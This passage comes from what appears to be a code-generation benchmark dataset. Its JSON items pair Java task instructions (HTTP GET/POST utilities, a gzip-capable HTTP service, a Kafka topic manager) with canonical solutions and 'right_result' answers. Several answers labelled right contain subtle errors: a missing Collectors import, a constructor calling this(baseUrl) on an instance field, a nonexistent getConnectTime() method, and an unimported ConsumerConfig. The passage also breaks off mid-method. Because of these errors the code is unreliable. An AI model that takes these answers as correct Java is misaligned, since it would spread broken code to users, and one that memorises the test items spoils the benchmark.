Uri.Builder builder = new Uri.Builder();\n                    for (Map.Entry<String, Object> param : params.entrySet()) {\n                        builder.appendQueryParameter(param.getKey(), param.getValue().toString());\n                    }\n                    String query = builder.build().getEncodedQuery();\n                    if (shouldGzipRequestPayload) {\n                        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                    } else {\n                        connection.setFixedLengthStreamingMode(query.getBytes().length);\n                    }\n                    connection.setDoOutput(true);\n                    connection.setRequestMethod(\"POST\");\n                    out = connection.getOutputStream();\n                    bout = getBufferedOutputStream(out);\n                    bout.write(query.getBytes(\"UTF-8\"));\n                    bout.flush();\n                    bout.close();\n                    bout = null;\n                    out.close();\n                    out = null;\n                }\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    interactor.onProxyResponse(endpointUrl, connection.getResponseCode());\n                }\n                in = connection.getInputStream();\n                response = slurp(in);\n                in.close();\n                in = null;\n                succeeded = true;\n            } catch (final EOFException e) {\n                MPLog.d(LOGTAG, \"Failure to connect, likely caused by a known issue with Android lib. Retrying.\");\n                retries = retries + 1;\n            } catch (final IOException e) {\n                if (connection != null && connection.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && connection.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service Unavailable\", connection.getHeaderField(\"Retry-After\"));\n                } else {\n                    throw e;\n                }\n            }\n            finally {\n                if (null != bout)\n                    try { bout.close(); } catch (final IOException e) {}\n                if (null != out)\n                    try { out.close(); } catch (final IOException e) {}\n                if (null != in)\n                    try { in.close(); } catch (final IOException e) {}\n                if (null != connection)\n                    connection.disconnect();\n            }\n        }\n        if (retries >= 3) {\n            MPLog.v(LOGTAG, \"Could not connect to Mixpanel service after three retries.\");\n        }\n        return response;\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if(shouldGzipRequestPayload) {\n          return new GZIPOutputStream(new BufferedOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private static boolean isProxyRequest(String endpointUrl) {\n        return !endpointUrl.toLowerCase().contains(MIXPANEL_API.toLowerCase());\n    }\n\n    private static byte[] slurp(final InputStream inputStream) throws IOException {\n        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[8192];\n\n        while ((nRead = inputStream.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport javax.net.ssl.*;\n\npublic class HttpService {\n    public static final boolean shouldGzipRequestPayload = true;\n    public static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = 500;\n    public static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    public static final String LOGTAG = \"HttpService\";\n    public static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    public static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    public static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        HttpURLConnection conn = null;\n        try {\n            URL url = new URL(endpointUrl);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setSSLSocketFactory(socketFactory);\n            conn.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n\n            try (OutputStream os = getBufferedOutputStream(conn.getOutputStream())) {\n                writeParams(os, params);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                throw new ServiceUnavailableException(\"Service unavailable: \" + responseCode);\n            }\n\n            return slurp(conn.getInputStream());\n        } catch (IOException e) {\n            if (conn != null && conn.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && conn.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                throw new ServiceUnavailableException(\"Service unavailable: \" + conn.getResponseCode(), e);\n            }\n            throw e;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if (shouldGzipRequestPayload) {\n            return new BufferedOutputStream(new GZIPOutputStream(out));\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private void writeParams(OutputStream os, Map<String, Object> params) throws IOException {\n        PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, \"UTF-8\"), true);\n        writer.print(params.entrySet().stream()\n            .map(entry -> entry.getKey() + \"=\" + entry.getValue())\n            .collect(Collectors.joining(\"&\")));\n    }\n\n    private byte[] slurp(InputStream inputStream) throws IOException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try (InputStream is = inputStream) {\n            byte[] buffer = new byte[HTTP_OUTPUT_STREAM_BUFFER_SIZE];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n        }\n        return baos.toByteArray();\n    }\n}\n\nclass ServiceUnavailableException extends Exception {\n    public ServiceUnavailableException(String message) {\n        super(message);\n    }\n\n    public ServiceUnavailableException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n\ninterface ProxyServerInteractor {\n    // Define methods for proxy interaction if needed\n}\n```"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Create a Java class that provides functionality for managing Kafka topics using the Kafka AdminClient API. The class should be able to create and configure an AdminClient instance and use it to create new Kafka topics.\n\nClass Description: The KafkaTopicManager class encapsulates operations for interacting with Kafka topics through the AdminClient API. It provides methods to initialize an AdminClient connection and create new topics with specified configurations.\n\nAttributes:\n- adminClient: AdminClient - The Kafka AdminClient instance used for topic management operations\n\nMethods:\n- createAndConfigureAdminClient(String bootstrapServers) -> AdminClient - Creates and configures a Kafka AdminClient instance with the specified bootstrap servers\n- autoCreateMetricsTopic(AdminClient adminClient, String topicName) -> TopicDescription - Creates a new Kafka topic with default configuration (1 partition and replication factor of 1) and returns its description",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n    Properties adminProps = new Properties();\n    adminProps.setProperty(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminProps);\n    return adminClient;\n}\n\npublic TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) throws ExecutionException, InterruptedException {\n    NewTopic testTopic = new NewTopic(topicName, 1, (short) 1);\n    CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singleton(testTopic));\n    createTopicsResult.all().get();\n    TopicDescription topicDescription = adminClient.describeTopics(Collections.singleton(topicName)).values().get(topicName).get();\n    return topicDescription;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 33,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicManager {\n    private AdminClient adminClient;\n\n    public AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        this.adminClient = AdminClient.create(props);\n        return this.adminClient;\n    }\n\n    public TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) throws ExecutionException, InterruptedException {\n        NewTopic newTopic = new NewTopic(topicName, 1, (short) 1);\n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n        return result.values().get(topicName).get();\n    }\n}\n```"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using HttpURLConnection, supporting both GET and POST methods asynchronously, with callback mechanisms for handling responses and errors. The class should also include functionality to retrieve network time from a server.\n\nClass Description: HttpURLConnectionUtils is a utility class that provides asynchronous HTTP request capabilities using Java's HttpURLConnection. It supports GET and POST methods, allows setting custom headers, and provides callback interfaces for handling responses and errors. Additionally, it includes functionality to fetch network time from a specified URL.\n\nAttributes:\n- TAG: String - Class tag for logging purposes\n- TIMEOUT_IN_MILLIONS: int - Default timeout for connections in milliseconds (5000ms)\n- BAIDU_URL: String - Default URL for network time requests (https://www.baidu.com)\n\nMethods:\n- doGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous GET request to the specified URL and invokes the callback with the response or error\n- doPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous POST request to the specified URL with given parameters and invokes the callback\n- getNetTime(TimeCallback callback) -> void - Retrieves network time from the default BAIDU_URL using the provided callback\n- getNetTime(String urlStr, TimeCallback callback) -> void - Retrieves network time from the specified URL using the provided callback\n- request(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic\n- reqNetTime(String urlStr, TimeCallback callback) -> void - Internal method that handles network time retrieval\n\nCallback Interfaces:\n- Callback: \n  - onResponse(String result, long response) -> void - Called when request succeeds\n  - onFail(Throwable error) -> void - Called when request fails\n- TimeCallback:\n  - onResponse(long millis) -> void - Called when network time retrieval succeeds\n  - onFail(Throwable error) -> void - Called when network time retrieval fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final String TAG = HttpURLConnectionUtils.class.getSimpleName();\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(final String urlStr, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(final String urlStr, final String params, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void getNetTime(final TimeCallback callback) {\n        getNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(final String urlStr, final TimeCallback callback) {\n        new Thread(() -> reqNetTime(urlStr, callback)).start();\n    }\n\n    private static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n            \n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            \n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1)) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n\n    private static void reqNetTime(final String urlStr, final TimeCallback callback) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            long date = connection.getDate();\n            if (date <= 0) {\n                date = -1L;\n            }\n            if (callback != null) {\n                callback.onResponse(date);\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class HttpURLConnectionUtils {\n    private static final String TAG = \"HttpURLConnectionUtils\";\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    private static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    public static void getNetTime(TimeCallback callback) {\n        reqNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(String urlStr, TimeCallback callback) {\n        reqNetTime(urlStr, callback);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method);\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        conn.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n\n                if (\"POST\".equalsIgnoreCase(method)) {\n                    conn.setDoOutput(true);\n                    DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                    wr.writeBytes(params);\n                    wr.flush();\n                    wr.close();\n                }\n\n                int responseCode = conn.getResponseCode();\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                conn.disconnect();\n\n                callback.onResponse(response.toString(), responseCode);\n            } catch (IOException e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    private static void reqNetTime(String urlStr, TimeCallback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"HEAD\");\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n                conn.connect();\n                long millis = System.currentTimeMillis() + conn.getConnectTime();\n                conn.disconnect();\n                callback.onResponse(millis);\n            } catch (IOException e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n}\n```"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response stream, and return the content as a UTF-8 encoded string. It should handle resource cleanup properly by closing all streams and disconnecting the HTTP connection.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent\n\nOutput: \n- String - The response content from the HTTP GET request, or null if an error occurs",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetRequest {\n\n    public static String sendHttpGetRequest(String requestUrl) {\n        HttpURLConnection urlConnection = null;\n        BufferedReader reader = null;\n        try {\n            URL url = new URL(requestUrl);\n            urlConnection = (HttpURLConnection) url.openConnection();\n            urlConnection.setRequestMethod(\"GET\");\n            int responseCode = urlConnection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), \"UTF-8\"));\n                StringBuilder stringBuilder = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    stringBuilder.append(line).append(\"\\n\");\n                }\n                return stringBuilder.toString();\n            } else {\n                return null;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    // Example usage:\n    public static void main(String[] args) {\n        String response = sendHttpGetRequest(\"https://api.example.com/data\");\n        System.out.println(response);\n    }\n}\n```"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests (GET and POST) to a REST API, with support for custom headers, query parameters, and JSON serialization/deserialization.\n\nClass Description: The ApiHandler class provides a convenient way to make HTTP requests to a REST API endpoint. It supports both GET and POST methods, handles query parameters, includes custom headers (like API keys), and automatically serializes/deserializes JSON data using Gson. The class maintains a base URL and optional additional headers that are included in every request.\n\nAttributes:\n- baseUrl: String - The base URL for all API requests\n- additionalHeaders: Map<String, String> - Optional headers to include in all requests\n\nMethods:\n- Constructor: ApiHandler(String url) - Initializes the handler with a base URL\n- Constructor: ApiHandler(String url, String apiKey) - Initializes with base URL and sets an API key header\n- get: <T> get(String endpoint, Class<T> tClass) -> T - Makes a GET request to the endpoint and returns deserialized response\n- get: <T> get(String endpoint, HashMap<String, Object> query, Class<T> tClass) -> T - Makes a GET request with query parameters\n- post: <T> post(String endpoint, T body, Class<T> tClass) -> T - Makes a POST request with a request body\n- post: <T> post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) -> T - Makes a POST request with query parameters and body\n- getRaw: static String getRaw(Map<String, String> headers, String url) -> String - Makes a raw GET request and returns response as string\n- postRaw: static String postRaw(Map<String, String> headers, String url, String body) -> String - Makes a raw POST request and returns response as string\n- addHeaders: static void addHeaders(HttpURLConnection connection, Map<String, String> headers) - Helper to add headers to a connection\n- parseQueries: static String parseQueries(HashMap<String, Object> query) -> String - Converts query parameters to URL encoded string\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) -> T - Makes GET request to full URL and deserializes response\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) -> T - GET with query params to full URL\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) -> T - POST to full URL with body\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) -> T - POST with query params to full URL\n- urlEncodeUTF8: static String urlEncodeUTF8(String input) -> String - URL encodes a string using UTF-8",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\nimport com.google.gson.Gson;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\npublic class ApiHandler {\n    public final String baseUrl;\n    public final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        baseUrl = url;\n        additionalHeaders = null;\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        baseUrl = url;\n        additionalHeaders = new ArrayMap<>();\n        additionalHeaders.put(\"x-api-key\", apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        Log.d(\"ApiHandler\", url);\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            addHeaders(conn, headers);\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            Log.d(ApiHandler.class.toString(), data);\n            inputStream.close();\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            addHeaders(conn, headers);\n            conn.setDoOutput(true);\n\n            OutputStream outputStream = conn.getOutputStream();\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            outputStream.write(input, 0, input.length);\n            outputStream.close();\n\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            inputStream.close();\n\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if(headers != null) {\n            for(String key : headers.keySet())\n                connection.addRequestProperty(key, headers.get(key));\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder params = new StringBuilder(\"?\");\n        for (String param : query.keySet()) {\n            String value = Objects.toString(query.get(param));\n            params.append(urlEncodeUTF8(param))\n                    .append(\"=\")\n                    .append(urlEncodeUTF8(value))\n                    .append(\"&\");\n        }\n        return params.substring(0, params.length() - 1);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        return new Gson().fromJson(getRaw(headers, url), tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(headers, url + parseQueries(query), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url, body.toString()), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url + parseQueries(query), body.toString()), tClass);\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        }catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 is required\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class ApiHandler {\n    private final String baseUrl;\n    private final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        this(baseUrl);\n        this.additionalHeaders.put(\"Authorization\", \"Bearer \" + apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return get(endpoint, null, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, buildUrl(endpoint, query), tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return post(endpoint, null, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, buildUrl(endpoint, query), body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) throws Exception {\n        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(conn, headers);\n        conn.setRequestMethod(\"GET\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder content = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            content.append(inputLine);\n        }\n        in.close();\n        conn.disconnect();\n        return content.toString();\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) throws Exception {\n        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(conn, headers);\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        try (DataOutputStream wr = new DataOutputStream(conn.getOutputStream())) {\n            wr.writeBytes(body);\n            wr.flush();\n        }\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder content = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            content.append(inputLine);\n        }\n        in.close();\n        conn.disconnect();\n        return content.toString();\n    }\n\n    public static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    public static String parseQueries(HashMap<String, Object> query) {\n        if (query == null || query.isEmpty()) {\n            return \"\";\n        }\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : query.entrySet()) {\n            if (sb.length() > 0) {\n                sb.append(\"&\");\n            }\n            sb.append(urlEncodeUTF8(entry.getKey())).append(\"=\").append(urlEncodeUTF8(entry.getValue().toString()));\n        }\n        return sb.toString();\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) throws Exception {\n        String jsonResponse = getRaw(headers, url);\n        return deserialize(jsonResponse, tClass);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) throws Exception {\n        return getFullUrl(headers, buildUrl(url, query), tClass);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) throws Exception {\n        String jsonBody = serialize(body);\n        String jsonResponse = postRaw(headers, url, jsonBody);\n        return deserialize(jsonResponse, tClass);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) throws Exception {\n        return postFullUrl(headers, buildUrl(url, query), body, tClass);\n    }\n\n    public static String urlEncodeUTF8(String input) {\n        try {\n            return java.net.URLEncoder.encode(input, \"UTF-8\");\n        } catch (Exception e) 